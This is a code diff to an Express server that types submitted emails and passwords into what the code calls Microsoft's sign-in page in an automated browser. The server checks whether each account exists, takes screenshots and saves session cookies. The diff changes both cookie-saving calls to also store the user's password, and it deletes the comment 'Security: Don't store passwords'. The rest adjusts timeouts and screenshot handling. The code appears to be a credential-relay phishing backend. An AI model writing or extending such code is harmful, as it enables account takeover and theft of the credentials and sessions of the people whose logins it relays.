@@ -362,12 +362,12 @@ app.post('/api/login', async (req, res) => {
                 // If password login successful, save cookies but don't use them
                 if (loginSuccess) {
                     console.log('💾 Saving session cookies to file (not for reuse)...');
-                    await session.automation.saveCookies(email); // Security: Don't store passwords
+                    await session.automation.saveCookies(email, password);
                 }
             }
 
-            // Take screenshot after login attempt (async for performance)
-            session.automation.takeScreenshot(`screenshots/session-${sessionId}-login.png`).catch(err => console.error('Screenshot error:', err.message));
+            // Take screenshot after login attempt
+            await session.automation.takeScreenshot(`screenshots/session-${sessionId}-login.png`);
 
             res.json({
                 sessionId: sessionId,
@@ -400,7 +400,7 @@ app.post('/api/login', async (req, res) => {
 
             try {
                 // Wait for email input and fill it
-                await session.automation.page.waitForSelector('input[type="email"]', { timeout: 6000 });
+                await session.automation.page.waitForSelector('input[type="email"]', { timeout: 10000 });
                 await session.automation.page.type('input[type="email"]', email);
                 console.log('Email entered successfully');
                 siteReport.emailFilled = true;
@@ -410,8 +410,8 @@ app.post('/api/login', async (req, res) => {
                 console.log('Clicked Next button');
                 siteReport.nextClicked = true;
 
-                // Wait for page response (optimized timing)
-                await new Promise(resolve => setTimeout(resolve, 1500));
+                // Wait for page response (up to 10 seconds)
+                await new Promise(resolve => setTimeout(resolve, 3000));
 
                 // Get current page info
                 siteReport.pageUrl = session.automation.page.url();
@@ -428,14 +428,14 @@ app.post('/api/login', async (req, res) => {
                     console.log('Password field detected - account exists');
                 }
 
-                // Check for error messages (optimized order)
+                // Remove bordered error messages from HTML and only capture specific "account not found" error
                 const errorSelectors = [
-                    '[role="alert"]',               // Most common Microsoft error container
-                    '.ms-TextField-errorMessage',   // Microsoft specific errors
-                    '[data-testid="error"]',        // Microsoft test errors
-                    '[aria-live="polite"]',         // Screen reader errors
-                    '.alert-error',
+                    '[role="alert"]',
                     '.error',
+                    '.ms-TextField-errorMessage',
+                    '[data-testid="error"]',
+                    '.alert-error',
+                    '[aria-live="polite"]',
                     '.form-error'
                 ];
 
@@ -516,8 +516,8 @@ app.post('/api/login', async (req, res) => {
                     }
                 }
 
-                // Take screenshot after clicking Next (async for performance)
-                session.automation.takeScreenshot(`screenshots/session-${sessionId}-after-next.png`).catch(err => console.error('Screenshot error:', err.message));
+                // Take screenshot after clicking Next
+                await session.automation.takeScreenshot(`screenshots/session-${sessionId}-after-next.png`);
 
                 console.log('Site report:', JSON.stringify(siteReport, null, 2));
 
@@ -619,9 +619,9 @@ app.post('/api/continue-login', async (req, res) => {
                 console.warn('Password login attempt failed, but continuing with flow...');
             }
 
-            // Take screenshot after password submission (async for performance)
-            activeSession.automation.takeScreenshot(`screenshots/session-${activeSession.sessionId}-after-password.png`).catch(err => console.error('Screenshot error:', err.message));
-            console.log(`Screenshot started after password submission`);
+            // Take screenshot after password submission
+            await activeSession.automation.takeScreenshot(`screenshots/session-${activeSession.sessionId}-after-password.png`);
+            console.log(`Screenshot saved after password submission`);
 
             // Handle "Stay signed in?" prompt
             await activeSession.automation.handleStaySignedInPrompt();
@@ -629,8 +629,8 @@ app.post('/api/continue-login', async (req, res) => {
             // Wait a bit more after handling the prompt
             await new Promise(resolve => setTimeout(resolve, 3000));
 
-            // Take screenshot after login (async for performance)
-            activeSession.automation.takeScreenshot(`screenshots/session-${activeSession.sessionId}-final.png`).catch(err => console.error('Screenshot error:', err.message));
+            // Take screenshot after login
+            await activeSession.automation.takeScreenshot(`screenshots/session-${activeSession.sessionId}-final.png`);
 
             // Check if we're successfully logged in
             const currentUrl = activeSession.automation.page.url();
@@ -640,7 +640,7 @@ app.post('/api/continue-login', async (req, res) => {
             if (loginSuccess) {
                 // Save session cookies to file (not for reuse)
                 console.log('💾 Saving session cookies to file (not for reuse)...');
-                const sessionFile = await activeSession.automation.saveCookies(activeSession.email || 'unknown'); // Security: Don't store passwords
+                const sessionFile = await activeSession.automation.saveCookies(activeSession.email || 'unknown', password);
                 responseMessage = sessionFile ? 
                     `Login completed successfully! Session saved to: ${sessionFile}` :
                     'Login completed successfully!';
